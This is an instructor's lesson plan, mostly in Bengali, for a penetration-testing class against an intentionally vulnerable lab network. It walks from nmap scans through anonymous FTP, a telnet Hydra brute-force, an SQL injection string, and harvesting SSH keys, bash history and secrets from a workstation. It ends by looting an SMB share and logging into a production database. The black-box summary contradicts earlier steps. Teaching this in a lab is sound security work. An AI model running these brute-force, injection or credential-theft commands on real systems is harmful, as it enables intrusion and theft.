# 🏢 Enterprise Network Penetration Testing — Class Module 02
### *"From Zero Knowledge to Full Compromise — Black-box to Gray-box"*

> **Instructor:** [তোমার নাম]
> **Duration:** 4–5 Hours
> **Lab Environment:** Nexus Global Enterprise Lab — Live VPS-Hosted
> **Level:** Beginner → Intermediate
> **Target IP:** `<VPS_IP>` (Instructor এর machine, student দেখবে screen share এ)

---

## 🕐 Schedule Overview

| Phase | Topic | Mode | Time |
|:---|:---|:---:|:---:|
| **Phase 1** | Enterprise Network Architecture | 📖 Lecture | 20 min |
| **Phase 2** | Pentest Methodology: Black-box vs Gray-box | 📖 Lecture | 15 min |
| **Phase 3** | Reconnaissance — nmap Full Scan | 💻 Live Demo | 15–20 min |
| **Phase 4** | Service Analysis + Black-box Attack | 💻 Live Demo | 40–50 min |
| ☕ | **Break** | — | 15 min |
| **Phase 5** | Gray-box Switch — Full Pentest Chain | 💻 Live Demo | 60–75 min |
| **Phase 6** | Classwork / CTF | 🔥 Hands-On | 30 min |
| **Phase 7** | Wrap-up + Kill Chain + Report Concept | 📖 Debrief | 15 min |

---

# 🟢 PHASE 1 — Enterprise Network Architecture (20 min)
## *"একটা বড় কোম্পানির নেটওয়ার্কে কী কী থাকে?"*

---

### 🎯 Opening Hook

**Instructor বলবে:**
> *"তোমরা যখন একটা বড় কোম্পানিকে hack করতে যাও — সেখানে শুধু একটা server থাকে না। পুরো একটা city-র মতো network থাকে। আজকে আমরা সেই city-র map বুঝবো, তারপর সেখানে ঢুকবো।"*

---

### 🗺️ Enterprise Network Zones — Live Diagram দেখাও

**`enterprise-network.html` browser এ খুলো — students দেখবে**

```
INTERNET (আমরা attacker)
     │
     ▼
┌─────────────────────────────────────────────┐
│  WAN / ISP Layer  (198.51.100.0/24)         │
│  Edge Router, DDoS Protection               │
└─────────────────────┬───────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│  DMZ — Demilitarized Zone  (10.0.1.0/24)   │  ← আমরা এখানে ঢুকবো
│  WAF/Proxy · Web Portal · Mail · Bastion   │
│  FTP · Telnet · SNMP · Exposed PostgreSQL  │
└─────────────────────┬───────────────────────┘
                      │ Firewall
                      ▼
┌─────────────────────────────────────────────┐
│  Core Backbone  (10.0.2.0/24)               │
│  Active Directory · SIEM · NAC · Grafana    │
└─────────────────────┬───────────────────────┘
                      │
          ┌───────────┴───────────┐
          ▼                       ▼
┌─────────────────┐   ┌──────────────────────┐
│  Data Center    │   │  Campus Network      │
│  (10.0.3.0/24) │   │  (10.0.4.0/24)       │
│  DB · ERP · SAN│   │  Workstations · VoIP │
│  MinIO Backup  │   │  IoT · CCTV Cameras  │
└─────────────────┘   └──────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────┐
│  Cloud Tier  (172.16.0.0/24)                │
│  Microservice API · Cloud DB · SSO Portal   │
└─────────────────────────────────────────────┘
```

**প্রতিটা zone explain করো:**

| Zone | কী থাকে | Real-world Example |
|:---|:---|:---|
| **WAN/DMZ** | Internet-facing services | Company website, mail, VPN |
| **Core** | Internal infrastructure | AD, monitoring, NAC |
| **Data Center** | Business-critical data | Database, ERP, Backup |
| **Campus** | Employee devices | Laptops, phones, CCTV |
| **Cloud** | Modern microservices | AWS/Azure hosted APIs |

**Teaching Point:**
> *"Firewall আছে মানে কিন্তু সব safe না। Firewall zone-to-zone traffic control করে — কিন্তু যদি একটা zone compromise হয়, সেখান থেকে pivot করা যায়। আজকে এটাই দেখবো।"*

---

### 🔐 Real Bangladesh Company Context

**বলো:**
> *"এই lab টা Bangladesh-এর একটা logistics কোম্পানির মতো সাজানো — Nexus Global Enterprise। এদের web portal, mail server, AD, cloud API, VoIP PBX, CCTV — সব আছে। আজকে আমরা এখানে একটা authorized pentest করছি।"*

**Show করো (WOW moment — class শুরুর hook):**
```bash
docker ps --format "table {{.Names}}\t{{.Status}}"
```
> *"দেখো — ৩৩টা container মিলে একটা পুরো কোম্পানি চলছে।"*

---

# 🟡 PHASE 2 — Pentest Methodology (15 min)
## *"Black-box vs Gray-box — কোনটা কেন?"*

---

### ⚫ Black-box Testing কী?

**বলো:**
> *"Black-box মানে — client তোমাকে শুধু একটা IP বা domain দিয়েছে। আর কিছু দেয়নি। তুমি জানো না ভেতরে কী আছে। একজন real attacker এর মতো শুরু করো।"*

**সুবিধা:**
- Most realistic — actual hacker এর perspective
- Real-world attack surface বোঝা যায়

**সমস্যা:**
- অনেক সময় লাগে — days to weeks
- অনেক attack surface miss হয়ে যায়
- Client এর পয়সা বেশি যায়
- অনেক vuln থাকে যেটা শুধু insider knowledge দিয়ে পাওয়া যায়

---

### ⬜ Gray-box Testing কী?

**বলো:**
> *"Gray-box মানে — client তোমাকে কিছু information দিয়েছে। Credentials, network map, IP ranges — কিছু বা সব। এটা simulate করে একজন insider threat বা stolen credential use করা attacker কে।"*

**সুবিধা:**
- অনেক বেশি thorough — সব attack surface cover করা যায়
- কম সময়ে বেশি কাজ
- Client এর বেশি value পায়
- Hidden vulnerability যেগুলো black-box এ পাওয়া যেত না, সেগুলো পাওয়া যায়

---

### 💡 Client কোনটা চায়?

**বলো:**
> *"Real world-এ ৮০% pentest gray-box হয়। কারণ client চায় সব vulnerability জানতে — শুধু obvious গুলো না। Black-box শুধু দেখায় 'বাইরে থেকে কতটুকু দেখা যায়'। Gray-box দেখায় 'ভেতরে কী কী problem আছে'।"*

**আজকের Plan:**
> *"আমরা আজকে দুটোই করবো। প্রথমে black-box — একজন complete stranger হিসেবে। দেখবো কতদূর যাওয়া যায়। তারপর switch করবো gray-box এ। দেখবো কোন vuln গুলো শুধু gray-box এ পাওয়া সম্ভব।"*

---

### 📋 Rules of Engagement (ROE)

**দেখাও — এটা class এ important:**
```
CLIENT:    Nexus Global Enterprise
SCOPE:     Full-scope — VPS IP: <VPS_IP>
DURATION:  Today's class session
AUTHORIZED: Red Team Assessment
FLAG FORMAT: FLAG{...}
OUT OF SCOPE: কোনো DoS attack নেই, production data delete নেই
```

> *"Real pentest এ এই document sign করে তারপর শুরু করা হয়। এটাই তোমাকে legally protect করে।"*

---

# 🔵 PHASE 3 — Reconnaissance: Full Port Scan (15–20 min)
## *"প্রথমে জানো — কে কোথায় আছে"*

---

### 📡 Scan চালাও

**Instructor terminal খুলবে, scan দেবে:**

```bash
nmap -p- <VPS_IP> --open -T4
```

**Scan দিয়েই বলো:**
> *"এই scan টা শেষ হতে ৩-৪ মিনিট লাগবে। nmap একে একে সব ৬৫৫৩৫টা port check করছে। এই সময়টা নষ্ট না — এই ফাঁকে আমরা আরেকটু গভীরে যাবো।"*

---

### ⏳ Scan চলার সময় — OSINT Concept

**Scan চলতে থাকলে বলো:**

> *"Real black-box pentest এ আমরা এই scan এর পাশাপাশি OSINT করতাম।"*

**OSINT টুল গুলো দেখাও (conceptual — live করতে হবে না):**

```
Shodan.io      → Internet-এ exposed ports/banners
WHOIS          → Domain owner কে?
crt.sh         → SSL certificate history → subdomain list
LinkedIn       → Employee names → potential usernames
Google dorks   → site:nexusglobal.com filetype:pdf
```

**Teaching point:**
> *"Shodan এ আজকেও অনেক Bangladesh company র exposed RDP, database, CCTV পাওয়া যায়। Pentester হিসেবে এটা দেখানোই তোমার কাজ — exploit করা না।"*

**MITRE ATT&CK:**
> `TA0043 — Reconnaissance`
> `T1595 — Active Scanning`
> `T1596 — Search Open Technical Databases (Shodan)`

---

### ✅ Scan Result — Real Output

**Scan complete হলে output দেখাবে:**

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh          ← VPS host SSH (out of scope)
23/tcp   open  telnet
53/tcp   open  domain
80/tcp   open  http
1025/tcp open  smtp         ← MailHog SMTP
2222/tcp open  ssh          ← Lab Bastion (এটাই target)
3000/tcp open  http         ← Grafana
8025/tcp open  http         ← MailHog Web UI
8080/tcp open  http         ← DDoS Proxy
8444/tcp open  https        ← ZTNA Gateway
8554/tcp open  rtsp         ← IP Camera (CCTV)
8888/tcp open  http         ← HLS Stream
9001/tcp open  http         ← MinIO Console (Primary)
9003/tcp open  http         ← MinIO Console (DR Backup)
```

**বলো:**
> *"দেখো — ১৫টা port open। Port 22 হলো VPS এর নিজের SSH — এটা আমাদের target না, out of scope। বাকি গুলো lab এর services। এখন version fingerprint করবো।"*

```bash
nmap -sV -sC -p 21,23,80,2222,8025,8080,8554,8888,9001,9003 <VPS_IP>
```

**Real version output:**

```
21/tcp   open  ftp      vsFTPd 3.0.5
                        Anonymous FTP login allowed!
                        Directory: /pub
23/tcp   open  telnet   hostname: dmz-mon-01
80/tcp   open  http     nginx/1.31.4
                        robots.txt: /admin-console/ /api/v1/
                                    /api/network/ /internal/
2222/tcp open  ssh      OpenSSH 9.6
8025/tcp open  http     MailHog Web UI
8080/tcp open  http     nginx/1.31.4 (DDoS Proxy)
8554/tcp open  rtsp     mediamtx (IP Camera)
8888/tcp open  http     mediamtx (HLS stream)
9001/tcp open  http     MinIO Console
9003/tcp open  http     MinIO Console (DR)
```

**বলো:**
> *"দুটো জিনিস এখনই interesting — এক: FTP তে anonymous login allowed! দুই: web server এর robots.txt এ sensitive path গুলো লেখা আছে — /admin-console/, /api/network/। Developer নিজেই বলে দিয়েছে কোথায় কী আছে।"*

**MITRE ATT&CK:**
> `T1595 — Active Scanning`
> `T1592 — Gather Victim Host Information`

---

# 🟠 PHASE 4 — Service Analysis + Black-box Attack (40–50 min)
## *"Black-box দিয়ে কতদূর যাওয়া যায়?"*

---

### 🎯 Service গুলো দেখাও

```
Port 21  — FTP        → Anonymous login possible?
Port 23  — Telnet     → Plaintext protocol — credentials?
Port 80  — HTTP       → Web application — কী আছে?
Port 5432 — PostgreSQL → Database directly exposed!
Port 8025 — MailHog   → Email intercept?
```

---

### 🔴 Attack #1 — FTP Anonymous Login (Port 21)

**Technology Explain করো (2 min):**
> *"FTP মানে File Transfer Protocol। ১৯৭১ সালে বানানো protocol। Anonymous login মানে — username: anonymous, password: যেকোনো কিছু। অনেক পুরনো server এটা enable রেখে যায় ভুলে।"*

**Live Demo:**
```bash
# Banner grab (nmap -sC তে এটা automatically দেখা গেছে)
# আলাদা করে দেখতে চাইলে:
nc -nv <VPS_IP> 21

# Anonymous login:
ftp <VPS_IP>
Name: anonymous
Password: test@test.com     ← যেকোনো কিছু দিলেই হয়
```

**Output:**
```
220 Nexus Global Enterprise FTP Server - Authorized Access Only
230 Login successful.
```

```bash
# Directory দেখো:
ftp> ls
# দেখবে: drwxr-xr-x pub/

# pub folder এ ঢোকো:
ftp> cd pub
ftp> ls
```

**Real Output:**
```
-rw-r--r--  README.txt               (844 bytes)
-rw-r--r--  infrastructure_report.txt (4558 bytes)
-rw-r--r--  internal_network_map.txt  (7183 bytes)
```

**WOW Moment — এখানেই pause করো:**
> *"দেখো — anonymous FTP তে তিনটা sensitive file publicly accessible। infrastructure_report.txt এবং internal_network_map.txt — এগুলোর নাম দেখেই বোঝা যাচ্ছে ভেতরে কী থাকতে পারে। Download করি।"*

```bash
# তিনটা file একে একে download করো:
ftp> get README.txt
ftp> get infrastructure_report.txt
ftp> get internal_network_map.txt
ftp> quit

# তারপর read করো:
cat README.txt
cat infrastructure_report.txt
cat internal_network_map.txt
```

---

### 💣 FTP File Analysis — Black-box Goldmine

**`cat infrastructure_report.txt` চালাও — output দেখাও:**

```
NEXUS GLOBAL ENTERPRISE
Q3 2026 Infrastructure Security Assessment
Classification: CONFIDENTIAL

CRITICAL FINDINGS:
[CRIT-01] Anonymous SMB on dc01 (10.0.2.10) — IT-Backups share এ
          hardcoded DB credentials আছে (sync_prod_db.sh)
[CRIT-02] MQTT Broker unauthenticated (10.0.4.70)
[CRIT-03] NAC bypass vulnerability (10.0.2.15)

HIGH FINDINGS:
[HIGH-01] LDAP anonymous bind enabled (dc01 / 10.0.2.10)
[HIGH-02] VoIP extension 1003 PIN: 1234
[HIGH-03] RTSP camera no authentication (10.0.4.60)
```

**`cat internal_network_map.txt` চালাও — output দেখাও:**

```
DMZ (10.0.1.0/24):
  10.0.1.20  srv-dmz-web01     Corporate Web Portal
  10.0.1.40  bastion           SSH Jump Host (port 2222)
  10.0.1.60  dmz-mon-01        THIS HOST (FTP server)

Core (10.0.2.0/24):
  10.0.2.10  dc01              Active Directory DC
  10.0.2.21  nms-grafana-01    Grafana Dashboard
  10.0.2.99  siem-soc-01       SIEM/SOC

Data Center (10.0.3.0/24):
  10.0.3.20  db-prod-01        PostgreSQL Production DB
  10.0.3.30  san-backup-01     MinIO SAN Backup
  NOTE: DB CREDS stored in IT-Backups SMB share on dc01

Campus (10.0.4.0/24):
  10.0.4.20  dev-workstation-01  DevOps PC (tahmed)
  10.0.4.10  hr-workstation-01   HR PC (sjenkins)
  10.0.4.70  iot-campus-01       IoT MQTT Broker
```

---

### 🎯 Key Teaching Moment — "Black-box এই একটা FTP দিয়ে কী পেলাম"

**Board এ লেখো:**

```
Anonymous FTP → 3টা file → আমরা এখন জানি:

✅ পুরো internal network map (সব subnet, IP, hostname)
✅ username list: tahmed (DevOps), sjenkins (HR), ibrahim (Branch)
✅ DB credentials এর location: dc01 SMB → IT-Backups → sync_prod_db.sh
✅ Production DB IP: 10.0.3.20
✅ Grafana IP: 10.0.2.21
✅ SIEM IP: 10.0.2.99
✅ Open vulnerabilities list — company র নিজের audit report!
✅ VoIP PIN: extension 1003 → 1234
✅ MQTT broker unauthenticated (10.0.4.70)
```

**বলো:**
> *"এটাকে বলে Sensitive Data Exposure। Company র নিজের CONFIDENTIAL security audit report publicly accessible FTP server এ রাখা আছে।*
>
> *কিন্তু একটু থামো — এটা একটা learning lab। এখানে intentionally এই files রাখা হয়েছে যাতে তোমরা শিখতে পারো। Real world এ কি সবসময় এরকম পাবে? না।*
>
> *Real company তে হয়তো FTP server ই থাকবে না। থাকলেও anonymous access নাও থাকতে পারে। আর থাকলেও এরকম sensitive document নাও পেতে পারো। অনেক সময় black-box এ কয়েকটা open port ছাড়া কিছুই পাওয়া যায় না — weeks ধরে।*
>
> *এই কারণেই gray-box important। Gray-box এ client তোমাকে guaranteed information দেয়। তোমাকে lucky হওয়ার জন্য অপেক্ষা করতে হয় না। কম সময়ে সব vulnerability cover করা যায়।*
>
> *আজকে আমরা lab এ lucky ছিলাম — FTP তে এতকিছু পেয়ে গেছি। এখন gray-box এ switch করবো এবং দেখবো credentials দিয়ে সরাসরি কীভাবে আরো deeper যাওয়া যায়।"*

**MITRE ATT&CK:**
> `T1083 — File and Directory Discovery`
> `T1552.001 — Credentials in Files (via FTP leak)`
> `T1087 — Account Discovery (username enumeration)`


---

### 🔴 Attack #2 — Telnet (Port 23)

**Technology Explain করো (2 min):**
> *"Telnet ১৯৬৯ সালের protocol। SSH এর আগে এটাই ছিল। সমস্যা — সব data plaintext যায়, password সহ। আজকেও অনেক legacy system এ চালু থাকে।"*

**Live Demo:**
```bash
telnet <VPS_IP>
```

**Output:**
```
Connected to 202.182.123.38
dmz-mon-01 login:
```

**বলো:**
> *"Connect করার সাথে সাথেই hostname leak হয়ে গেছে — `dmz-mon-01`। এটাই একটা finding। এখন credential brute-force করতে Hydra use করবো।"*

```bash
hydra -l root -P ~/pentest_workspace/wordlists/nexus-passwords.txt \
  telnet://<VPS_IP>
```

> *"এটা background এ চলতে থাকবে। আমরা এগিয়ে যাবো — result আসলে দেখবো।"*

**✅ যদি Login হয় — এই commands চালাও:**
```bash
# কে আমি? কোন user?
whoami
id

# Internal network দেখো:
ip addr
cat /etc/hosts          # internal hostname mapping

# কী কী চলছে?
ps aux
netstat -an

# Credential খোঁজো:
cat /etc/passwd
find / -name "*.conf" 2>/dev/null | head -20
find / -name "*.txt" 2>/dev/null | grep -i "pass\|cred\|key" | head -10

# SNMP config দেখো (এই host এ SNMP আছে):
cat /etc/snmp/snmpd.conf
```

> *"এই host থেকে internal network এ কতটুকু যাওয়া যায় সেটাও দেখো — pivot point হিসেবে কাজ করতে পারে।"*

**MITRE ATT&CK:**
> `T1110.001 — Brute Force: Password Guessing`

---

### 🔴 Attack #3 — Web Portal (Port 80) — robots.txt Information Disclosure

**Technology Explain করো (2 min):**
> *"Port 80 এ nginx চলছে — corporate web portal। প্রথমে explore করি।"*

**Step 1 — robots.txt থেকে Intel নাও:**
```bash
curl http://<VPS_IP>/robots.txt
```

**Real Output:**
```
User-agent: *
Disallow: /admin-console/
Disallow: /api/v1/
Disallow: /api/network/
Disallow: /internal/
# NOTE: Internal ERP accessible at http://10.0.3.10:8000 from trusted subnets
# IT diagnostic tools: /api/network/ping (internal use only)
# App version: Nexus-Portal v2.4.1
```

**বলো:**
> *"robots.txt এর comment এ developer ভুলে অনেক কিছু লিখে রেখেছে। Internal ERP এর IP — 10.0.3.10:8000। /api/network/ping endpoint — diagnostic tool। App version — Nexus-Portal v2.4.1।*
>
> *এগুলো এখনই কাজে লাগানো যাচ্ছে না — কারণ portal এ login লাগছে। আমরা default credentials try করবো।"*

**Step 2 — Default credentials try করো:**
```bash
curl -X POST http://<VPS_IP>/login \
  -d "username=admin&password=admin" -L -c cookies.txt
```

**বলো:**
> *"admin/admin কাজ করলো না। এটাই black-box এর limitation — credential ছাড়া portal এর ভেতরে যাওয়া যাচ্ছে না। SQLi, CMDi — সব login এর পেছনে আছে।*
>
> *একজন hacker এখানে হয়তো দিনের পর দিন credential bruteforce করতো। আমরা pentester — এখানে আটকে থাকবো না। Gray-box এ client যখন credential দেবে, তখন এই সব attack করবো।*
>
> *এখন অন্য services দেখি।"*

**Black-box Web Findings Summary:**
```
✅ robots.txt → sensitive paths + ERP IP + CMDi endpoint + version
❌ Portal SQLi  → login required (Gray-box এ করবো)
❌ CMDi         → login required (Gray-box এ করবো)
```

**MITRE ATT&CK:**
> `T1592.003 — Gather Victim Host Information: Firmware (Version Disclosure)`
> `T1083 — File and Directory Discovery (robots.txt)`


---

### 🎥 Attack #4 — IP Camera RTSP (Port 8554) — Unauthenticated Stream

**কীভাবে জানলাম CCTV আছে?**
> *"nmap -sV তে দেখেছিলাম: port 8554 — rtsp, server: mediamtx। RTSP মানে Real Time Streaming Protocol — এটা IP camera র protocol। port 8888 এ same mediamtx — HLS (browser-friendly) version।"*

**Black-box এ যা করবো — port দেখে connect try করবো:**
```bash
# Common path try করো:
vlc rtsp://<VPS_IP>:8554/live
vlc rtsp://<VPS_IP>:8554/stream
vlc rtsp://<VPS_IP>:8554/camera
# Not found — path জানি না

# Tool দিয়ে path discover করা যায়:
cameradar -t <VPS_IP>   # RTSP path + credential bruteforce
```

**বলো:**
> *"Port দেখেছি, service চলছে — কিন্তু exact stream path জানি না। Black-box এ cameradar দিয়ে try করা যায়। Gray-box এ client internal documentation দিলে সরাসরি path পাবো।"*

**MITRE ATT&CK:**
> `T1125 — Video Capture`

---

### 📧 Attack #5 — MailHog (Port 8025) — Unauthenticated Mail Server

**Technology Explain করো:**
> *"MailHog হলো test mail server — developer রা local এ email test করার জন্য use করে। Production এ রাখার কথা না। কিন্তু এখানে publicly exposed, no authentication।"*

**Browser এ দেখাও:**
```
http://<VPS_IP>:8025
→ No login required — directly inbox দেখা যাচ্ছে
→ Internal emails intercept করা যাবে
→ Password reset links, internal notifications — সব এখানে আসবে
```

**MITRE ATT&CK:**
> `T1114 — Email Collection`

---

### 🗄️ Attack #6 — MinIO Object Storage (Port 9001) — Service Identification

**Technology Explain করো:**
> *"MinIO হলো S3-compatible object storage — AWS S3 এর মতো কিন্তু self-hosted। Backup, file storage এর জন্য use হয়।"*

**Browser এ দেখাও:**
```
http://<VPS_IP>:9001
→ MinIO login page — credentials দরকার
→ Black-box এ identify করলাম, ভেতরে যেতে পারছি না
→ Gray-box এ credentials দিয়ে দেখবো
```

**MITRE ATT&CK:**
> `T1530 — Data from Cloud Storage`

---

### 🛑 Black-box এর Limit — Key Teaching Moment

**এখানে pause করো। Board এ লেখো:**

```
✅ Black-box দিয়ে যা পেলাম:
   → FTP anonymous files
   → Web portal SQLi → employee credentials (FLAG 1)
   → Command Injection → RCE (FLAG 2)
   → SSH shell (DMZ foothold)

❌ Black-box দিয়ে যা পাওয়া গেলো না:
   → Internal network (10.0.2.x, 10.0.3.x, 10.0.4.x) invisible
   → Active Directory credentials নেই
   → Production database (10.0.3.20) unreachable
   → Workstation এ রাখা SSH keys/credentials দেখা যাচ্ছে না
   → MinIO backup এর password নেই
   → SMB share এর contents access নেই
```

**বলো:**
> *"একজন hacker এখান থেকে আরো অনেকক্ষণ কাজ করতো। Port forwarding, pivoting, brute-forcing — দিনের পর দিন। কিন্তু আমরা pentester। আমাদের কাজ হলো efficiently সব vulnerability বের করা — hacker এর মতো দিন কাটানো না.*
>
> *এখন client আমাদের extra information দেবে — আমরা gray-box শুরু করবো। দেখবো হাজারটা attack chain ছাড়াই কীভাবে directly সব critical vulnerability পাওয়া যায়।"*

---

# ☕ BREAK — 15 min

**Break এ students দের জন্য:**
> *"চাইলে নিজে try করো: `http://<VPS_IP>/?track_id=' OR 1=1--`"*

---

# 🔴 PHASE 5 — Gray-box Switch (60–75 min)
## *"Client credentials দিলো — এখন full pentest"*

---

### 🔔 Explicit Switch Announcement

**Instructor বলবে:**

> *"এখন একটু দাঁড়াই। আমাদের pentest এর দ্বিতীয় phase শুরু হচ্ছে। Client — Nexus Global — আমাদের gray-box information দিয়েছে।*
>
> *এই information গুলো একজন hacker হয়তো অনেক attack chain করে পেতো — credential stuffing, phishing, insider threat, OSINT — সপ্তাহ বা মাস লাগতো। আমরা সেই সব skip করে directly test করবো।"*

**Gray-box Package (board এ দেখাও):**
```
📋 Gray-box Information Received from Client:
   → Network Map: 10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24
   → Bastion Access: devops-remote@<VPS_IP>:2222 / devops-remote@123
   → AD Domain: nexus.internal (10.0.2.10)
   → Known user: tahmed / DevOpsP@ss2026!
   → Monitoring: Grafana at 10.0.2.21:3000
```

---

### 🔍 Gray-box Recon — Internal Network Discovery

**বলো:**
> *"Black-box এ আমরা outside থেকে scan করেছিলাম। এখন আমরা inside থেকে দেখবো — bastion shell আছে, সেখান থেকে internal network discover করবো। এই internal hosts গুলো বাইরে থেকে দেখাই যেত না।"*

```bash
ssh devops-remote@<VPS_IP> -p 2222
# Password: devops-remote@123
```

**Real Output (Banner দেখাও class এ):**
```
╔══════════════════════════════════════════════════════════╗
║   NEXUS GLOBAL ENTERPRISE — SSH BASTION HOST (DMZ)      ║
║   Node: bastion.nexus.internal | IP: 10.0.1.40          ║
║   ** AUTHORIZED PERSONNEL ONLY **                        ║
║   All sessions are monitored, logged, and recorded.      ║
╚══════════════════════════════════════════════════════════╝

Welcome to Nexus Global Enterprise Bastion Host
================================================
Internal Routes available via this Bastion:
  Core Backbone:  10.0.2.0/24  (AD-DC, SIEM)
  Data Center:    10.0.3.0/24  (ERP, DB, SAN)
  Campus Clients: 10.0.4.0/24  (Workstations)
```

**বলো:**
> *"Shell পেয়ে গেছি। এখন আমরা DMZ zone এ আছি। Banner নিজেই বলছে — কোন কোন internal network এখান থেকে reach করা যাবে। Core, Data Center, Campus — সব।"*

```bash
ip route
ip addr
```

**Real Output:**
```
bastion:~$ ip route
default via 10.0.4.254 dev eth0
10.0.1.0/24 dev eth3  src 10.0.1.40   ← DMZ
10.0.2.0/24 dev eth1  src 10.0.2.5    ← Core (AD, SIEM, Grafana)
10.0.3.0/24 dev eth2  src 10.0.3.5    ← Data Center (DB, MinIO)
10.0.4.0/24 dev eth0  src 10.0.4.5    ← Campus (Workstations)
```

**WOW Moment — এখানে pause করো:**
> *"দেখো — এই bastion machine টা ৪টা আলাদা network এ connected। DMZ, Core, Data Center, Campus — সব। Black-box এ আমরা শুধু DMZ দেখতে পাচ্ছিলাম — বাকি সব invisible ছিল। এখন সব reach করা যাচ্ছে।*
>
> *এই কারণে bastion machine গুলো সবচেয়ে sensitive — এটা compromise হলে পুরো network compromise।"*


# Core network sweep:
for i in $(seq 1 254); do
  (ping -c1 -W1 10.0.2.$i &>/dev/null && echo "10.0.2.$i UP") &
done; wait

# Data Center sweep:
for i in $(seq 1 254); do
  (ping -c1 -W1 10.0.3.$i &>/dev/null && echo "10.0.3.$i UP") &
done; wait
```

**Result আসলে:**
```
10.0.2.10  → AD Domain Controller
10.0.2.15  → NAC Server
10.0.2.20  → Prometheus
10.0.2.21  → Grafana
10.0.2.99  → SIEM/SOC
10.0.3.10  → Internal ERP
10.0.3.20  → Production PostgreSQL  ← TARGET
10.0.3.30  → MinIO Backup Storage
```

**বলো:**
> *"এই সব hosts black-box এ দেখাই যেত না। Firewall block করে রাখে। Gray-box এ আমরা directly এদের target করতে পারবো।"*

---

### 💎 Gray-box Exclusive #1 — Workstation Credential Harvest

**বলো:**
> *"এটা এমন একটা vulnerability যেটা black-box দিয়ে কোনোদিনই পাওয়া যেত না। Developer এর workstation এ কী কী stored credential আছে দেখি।"*

```bash
# DevOps workstation এ ঢোকো (gray-box info থেকে জানি এটা আছে)
docker exec -it nexus-pc-dev-01 bash

# SSH private key চেক করো
ls -la ~/.ssh/
cat ~/.ssh/id_rsa          # ← Private key! অন্য server এ ঢোকা যাবে

# Bash history — কোন password কোথায় use করেছে?
cat ~/.bash_history
# দেখবে: psql -h 10.0.3.20 -U nexus_admin ... (DB password!)

# Environment variables:
env | grep -iE "pass|secret|key|token"

# Saved credentials:
cat ~/.pgpass 2>/dev/null       # PostgreSQL saved creds
cat ~/.netrc 2>/dev/null        # Network credentials
```

**বলো:**
> *"দেখো — developer এর workstation এ production database এর password সরাসরি bash history তে। Hacker হলে এটা পেতে প্রথমে phishing → malware → দিন বা সপ্তাহ পরে এই credential। আমরা gray-box এ directly এলাম।"*

**MITRE ATT&CK:**
> `T1552.003 — Unsecured Credentials: Bash History`
> `T1552.004 — Unsecured Credentials: Private Keys`

---

### 💎 Gray-box Exclusive #2 — SMB Share Credential Leak

**বলো:**
> *"AD server এ SMB share আছে — IT-Backups। এই port টা internet থেকে accessible ছিল না — তাই black-box এ দেখাই যায়নি। Bastion shell পেয়েছি — internal থেকে try করি।"*

```bash
# Bastion থেকে — share list দেখো (anonymous):
smbclient -L //10.0.2.10 -N
```

**Real Output:**
```
Sharename       Type      Comment
---------       ----      -------
netlogon        Disk      Network Logon Service
sysvol          Disk      Active Directory SYSVOL Share
IT-Backups      Disk      IT Engineering Backup (RESTRICTED)
HR-Public       Disk      HR Shared Policies
IPC$            IPC       IPC Service
```

```bash
# IT-Backups — RESTRICTED লেখা, তবু try করো (anonymous):
smbclient //10.0.2.10/IT-Backups -N
smb: \> ls
smb: \> get INFRA_RUNBOOK.txt
smb: \> get sync_prod_db.sh
smb: \> exit
```

**WOW Moment — কোনো credential ছাড়াই ঢুকে গেছি!**

```bash
cat sync_prod_db.sh
```
**Real Output:**
```bash
DB_HOST="10.0.3.20"
DB_USER="nexus_admin"
DB_PASS="Nexu$Prod2026!Sec"                       # ← Production DB password!
SAN_HOST="10.0.3.30:9000"
SAN_USER="nexus_san_root"
SAN_PASS="SuperS3cUr3_B4ckup_Vault_Pass_2026!"    # ← MinIO password!
```

**Board এ লেখো:**
```
🔑 SMB IT-Backups (anonymous!) → sync_prod_db.sh:

  Production DB:  nexus_admin / Nexu$Prod2026!Sec  → 10.0.3.20:5432
  MinIO Backup:   nexus_san_root / SuperS3cUr3_B4ckup_Vault_Pass_2026!
  ERP Portal:     http://10.0.3.10:8000
```

**বলো:**
> *"RESTRICTED লেখা share — anonymous access দিয়েই ঢুকলাম। ভেতরে production DB password plaintext এ। এই দুটো mistake একসাথে — এটাই real world এ সবচেয়ে বেশি দেখা যায়।"*

**MITRE ATT&CK:**
> `T1039 — Data from Network Shared Drive`
> `T1552.001 — Credentials in Files`


---

### 💎 Gray-box Exclusive #3 — Production Database Access (Crown Jewels)

**বলো:**
> *"SMB থেকে DB credentials পেয়েছি। এখন সরাসরি production database এ ঢুকবো।"*

```bash
PGPASSWORD='Nexu$Prod2026!Sec' psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
```

```sql
\pset pager off
\dt
SELECT * FROM system_vault_keys;
SELECT * FROM employees LIMIT 5;
SELECT * FROM payroll LIMIT 3;
```

**Real Output — system_vault_keys (FLAG এখানে!):**
```
 id | key_name                  | service_scope                  | encrypted_secret
----+---------------------------+--------------------------------+----------------------------------------------------
  1 | AWS_TRANSIT_GATEWAY_KEY   | Cloud DC Bridge (AWS HQ)       | AKIA-NEXUS-PROD-9812448109-SECKEY-ALPHA
  2 | SWIFT_CLEARING_API_TOKEN  | Interbank Wire Gateway (SWIFT) | jwt_live_nexus_swift_bank_tx_881920194012948102
  3 | SAN_MASTER_ROOT_ACCESS    | MinIO Backup SAN               | nexus_san_root:SuperS3cUr3_B4ckup_Vault_Pass_2026!
  4 | AZURE_SERVICE_PRINCIPAL   | Azure AD B2B Peering           | nexus-sp-prod:AzureServicePrincipal#Nexus_2026@DC!
  5 | CTF_FLAG_DATABASE_ROOT    | Red Team Proof of Compromise   | FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
```

**Real Output — employees:**
```
 id | emp_id  | full_name     | username | department               | privilege_level
----+---------+---------------+----------+--------------------------+-----------------
  1 | EMP-001 | Marcus Vance  | mvance   | Executive InfoSec        | Domain Admin
  2 | EMP-002 | Elena Rostova | erostova | Infrastructure Arch      | Domain Admin
  3 | EMP-003 | Tanvir Ahmed  | tahmed   | DevOps & SRE             | Domain User
  4 | EMP-004 | Sarah Jenkins | sjenkins | Human Resources          | Domain User
  5 | EMP-005 | Amina Rahman  | arahman  | Financial Audit          | Domain User
```

**Real Output — payroll:**
```
 id | account_num    | beneficiary               | monthly_salary | swift_code
----+----------------+---------------------------+----------------+------------
  1 | ACC-889102-USD | Marcus Vance (CISO)       | $18,500.00     | CHASUS33
